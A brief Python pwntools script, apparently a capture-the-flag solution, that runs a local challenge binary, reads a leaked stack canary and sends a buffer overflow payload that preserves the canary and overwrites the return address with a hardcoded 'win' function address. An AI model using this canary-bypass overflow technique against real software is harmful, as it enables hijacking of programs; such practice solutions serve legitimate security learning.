
from pwn import *

target = process("./chall")

var = target.recvuntil(b"This program has a canary (0x")
canary = target.recvuntil(b")")[:-1].strip().decode()

print("Canary is", canary)

canary = int(canary, 16)

win = 0x004015e6

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
